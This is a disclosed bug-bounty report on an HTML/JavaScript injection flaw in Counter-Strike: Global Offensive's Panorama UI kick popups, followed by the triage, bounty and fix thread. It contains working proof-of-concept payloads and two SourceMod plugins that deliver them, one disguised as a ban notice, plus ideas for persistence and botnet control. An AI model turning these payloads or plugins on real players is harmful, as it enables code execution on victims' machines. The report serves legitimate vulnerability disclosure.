@@ -1,0 +1,199 @@
+Overview
+Counter-Strike: Global Offensive's UI is built of a framework called Panorama which is heavily influenced by modern HTML/CSS with JS capabilities. Because of these properties, the UI becomes easily vulnerable to different types of code injection, most notably XSS.
+
+Previously, it was discovered that a certain message-type sent through the lobby chat allowed anyone to send raw HTML strings that would then be parsed by the Panorama framework as valid HTML. The reason this XSS was possible was because of a certain Panorama tag that was left enabled.
+
+In order to see how these Panorama files are constructed, you must extract them from the CS:GO files. By unzipping the file under steamapps\common\Counter-Strike Global Offensive\csgo\panorama\code.pbin, a plethora of UI files are revealed. In these files we can see how this lobby XSS was possible by looking in the file named panorama\layout\chat.xml on line 18 we can see
+
+<Label html="true" text="&lt;span class='chat-entry__name'&gt;{s:player_name}&lt;/span&gt; {s:msg}" acceptsinput="true" />
+By having html="true" in a Panorama tag, any input is parsed as raw HTML. This is what lead to the discovery of this exploit. We grepped through all the Panorama layout files looking for any that contained html="true" and within a few seconds we found a particular file with the name panorama\layout\popups\popup_generic.xml. We knew that the disconnect message was utilizing this exact file which is when we started to test.
+
+Our first payload was testing if an image could load via a custom disconnect message. So we tried a simple payload disconnect "<img src='https://i.imgur.com/IbJKM0M.jpg'>", and after running it twice (for caching purposes), the cat appeared to our surprise.
+
+Now that we knew disconnect popups were exploitable, we tried to see if this could be done remotely through the kick function. We tested first on local servers with the kickid command but had no luck. We then setup a dedicated server with SourceMod and attemped to kick with sm_kick. This worked at first but it had a character limit which did not allow much room for meaningful payloads. After reading through SourceMod documentation, we found a function called KickClient() which did not have a character limit. After testing with some common payloads, we concluded that <a onmouseover='javascript:CODE'></a> is the best method with the least amount of user interaction to trigger code execution since the Panorama HTML parser is very limited in the amount of working tags and event listeners which is highlighted here.
+
+Steps to reproduce
+Setup a dedicated CS:GO server
+Install SourceMod and Metamod
+Download the attached SourceMod plugin and place it under \addons\sourcemod\plugins\: testkick.smx (F518946)
+Start up CS:GO and connect to the server
+Run this string in your client's console:
+
+sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
+Mouse over the text The remote host stopped receiving communications and closed the connection.
+
+PoC
+
+Triggered with the command:
+
+sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
+SourceMod Kick Plugin Source testkick.smx (F518946)
+#include <sourcemod>
+
+#pragma semicolon 1
+#pragma newdecls required
+
+public void OnPluginStart()
+{
+    RegConsoleCmd("sm_testkick", Cmd_Kick);
+}
+
+public Action Cmd_Kick(int client, int args)
+{
+    if (args <= 0) {
+        PrintToChat(client, "No arguments provided - Usage: !testkick <Kick Message>");
+        return Plugin_Handled;
+    }
+
+    char full[5120];
+    GetCmdArgString(full, sizeof(full));
+
+    for (int i = 0; i < 5; i++) {
+        KickClient(client, full);
+    }
+
+    return Plugin_Handled;
+}
+Impact
+An attacker could achieve full system access to the victims computer. A dummy server can be setup with an autokick message containing the payload. The victim would just need to join the attackers server and they would become infected. Moreover, an attacker could trick a server owner into installing a malicious SourceMod plugin that would be able to deliver the malicious payload to anyone on the server.
+
+Similar to #470520, the exploit can be triggered via browser by connecting the victim to an attacker controlled server.
+
+This exploit could also be combined with any Panorama function present here in order to further mess with the game's functionality (such as starting and accepting a new match or displaying a custom popup message). The attacker virtually has full control over all UI features.
+
+Even though the payload is only triggered via the mouseover event, because the way the message appears in the center of the victim's screen and the ability to fill the center of the screen with exploitable text, user interaction is negligible.
+
+It is also possible to persist the Javascript code execution by hoisting a function to the scheduler. Eg. $.Schedule(1, function). Furthermore, it is possible to set up a persistent remote connection to the victim's game instance by utilizing eval() and $.AsyncWebRequest() which would allow the attacker to manage multiple victims in some sort of botnet.
+
+Yours respectfully,
+Shay @shayhelman and Felix @dukebruno123
+
+3 attachments:
+F518945: cIvlT8vHqy.gif
+F518946: testkick.smx
+F518974: cat.png
+orangebandHackerOne staff posted a comment.	Jul 1st (4 months ago)
+Hi @shayhelman,
+
+Thank you for your submission. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.
+
+Kind regards,
+@orangeband
+
+glassofbeerHackerOne staff changed the status to Needs more info.	Jul 2nd (4 months ago)
+@shayhelman
+
+When you say:
+
+Run this string in your client's console:
+
+sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
+
+Do you mean that, as a victim, we need to execute that string in the client's console?
+
+At some point you also mentioned that it should be possible to configure an auto kick that would trigger the issue, so I'm just trying to understand the attack flow and the level of user interaction required to exploit the issue.
+
+shayhelman changed the status to New.	Jul 3rd (4 months ago)
+Hi @glassofbeer,
+Sorry if this was not clear in the report. The sm_testkick testkick.smx (F518946) command is meant to replicate what it would be like if the server initiated a KickClient on a user which in this case is yourself. As a victim, you would require no interaction in order to bring up the message The remote host stopped receiving communications and closed the connection. highlighted here. After the kick message initiated by the server is sent to the victim/client, the user must have their mouse over the kick message which in this case is The remote host stopped receiving communications and closed the connection.. The reason I state that the mouse-over user interaction is neglible meaning that there is basically no user interaction, is because once a client is kicked and they are tabbed-in, their mouse defaults to the center position of the screen, forcing the payload to trigger.
+
+If you have any more questions, please tell me.
+
+Thank you,
+@shayhelman
+
+shayhelman posted a comment.	Jul 3rd (4 months ago)
+Regarding your comment on the auto-kick that an attacker would set up, we have made a plugin that will do just that. autokick.smx (F521670)
+Again place the file in the SourceMod plugins folder and restart the server.
+
+The plugin waits for the victim to choose a team and spawns in-game, then initiates a kick. This is done in order to ensure that the victim's mouse is already hovering over our payload, making this exploit require no user interaction to trigger.
+
+#include <sourcemod>
+
+#pragma semicolon 1
+#pragma newdecls required
+
+// Create hook event for when a player spawns
+public void OnPluginStart()
+{
+    HookEvent("player_spawned", Event_PlayerSpawned);
+}
+
+// When the event gets fired create a 0.1 second timer
+public Action Event_PlayerSpawned(Event event, const char[] name, bool dontBroadcast)
+{
+    int userid = event.GetInt("userid");
+    CreateTimer(0.1, DoKick, userid);
+    return Plugin_Continue;
+}
+
+// Do the actual kick once the timer is over
+public Action DoKick(Handle timer, int userid)
+{
+    // We have to validate the client before doing anything else we might crash
+    int client = GetClientOfUserId(userid);
+    if (client <= 0 || client > MAXPLAYERS || IsFakeClient(client)) {
+        return Plugin_Continue;
+    }
+
+    // Kick with malicious message
+    KickClient(client, "<a onmouseover=\"javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')\">-------------------------\nBANNED\n-------------------------\n\nYour account has been banned from this community.\n\nThe ban is non negotiable</a>");
+    return Plugin_Continue;
+}
+Here is a video of the autokick in action:
+
+
+2 attachments:
+F521677: autokick.gif
+F521670: autokick.smx
+glassofbeerHackerOne staff posted a comment.	Jul 3rd (4 months ago)
+@shayhelman
+
+Thanks for the added info. I'll escalate this to Valve's team and we will get back to you as soon as there are any updates.
+
+shayhelman posted a comment.	Updated Jul 18th (3 months ago)
+Any updates on this issue? Also, will this report be marked as triaged?
+
+shayhelman posted a comment.	Jul 25th (3 months ago)
+Just to clarify, this report has been triaged correct? If so, will the status be changed as such?
+
+Thank you,
+shay
+
+sodacanHackerOne staff posted a comment.	Aug 1st (3 months ago)
+Hi @shayhelman,
+The report is still under review by the internal team and has not been confirmed as valid yet. As soon as we can provide you with those updates we will let you know. Thank you for you patience on this.
+@sodacan
+
+shayhelman posted a comment.	Aug 29th (2 months ago)
+Hello,
+
+Any updates? I've noticed that this issue has been resolved in a recent update here but no response on this report.
+
+Thanks,
+shay
+
+Valve rewarded shayhelman with a $9,000 bounty.	Sep 5th (2 months ago)
+misterhoten closed the report and changed the status to Resolved.	Sep 5th (2 months ago)
+Hi shayhelman,
+
+Thanks for the report! We have deployed a fix to our production systems. Please let us know if you are still able to reproduce the issue.
+
+shayhelman requested to disclose this report.	Sep 5th (2 months ago)
+Thank you very much I can no longer reproduce, the whole disconnect popup no longer parses HTML, is it okay to disclose?
+
+misterhoten posted a comment.	Oct 8th (12 days ago)
+Hi, sorry for the late response on your disclosure request. If you use the h1 'request disclosure' feature you might get faster response on those than you get by leaving a comment.
+
+After we ship a mitigation, we generally favor disclosing bugs. Just let us know if you have a timing request for disclosure or if we should just click the disclose button.
+
+shayhelman posted a comment.	Updated Oct 8th (12 days ago)
+Hmm that's weird, on my end it shows as shayhelman requested to disclose this report. for the last comment I sent. The current option for this report is to cancel the disclosure request. Should I cancel and re-request the disclosure?
+
+misterhoten posted a comment.	Oct 9th (12 days ago)
+Oh whoops, you're totally right. That's an error on my part, I must have been looking at the wrong browser tab or something. In that case, apologies for sitting on it for so long.
+
+Just let us know if you have any timing restrictions and we'll disclose.
+
+shayhelman posted a comment.	Oct 9th (12 days ago)
+I am fine if you disclose right now, thanks.
